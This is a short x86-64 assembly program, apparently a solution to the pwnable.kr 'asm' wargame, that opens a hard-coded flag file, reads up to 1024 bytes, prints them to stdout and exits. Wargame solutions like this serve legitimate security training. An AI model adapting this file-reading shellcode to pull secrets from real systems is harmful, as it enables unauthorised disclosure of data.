section .data 
  pathname db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0

section .bss
  buffer: resb 1024

section .text
  global _start

_start:

  %define O_RDONLY 0x0

  ;open
  mov rax, 2
  mov rdi, pathname
  mov rsi, O_RDONLY 
  mov rdx, 0
  syscall
  
  ;read
  mov rdi, rax
  mov rax, 0
  mov rsi, buffer
  mov rdx, 1024
  syscall

  ;write
  mov rax, 1
  mov rdi, 1
  mov rsi, buffer
  mov rdx, 1024
  syscall


  ;exit syscall
  mov rax, 1
  mov rdi, 5
  int 0x80
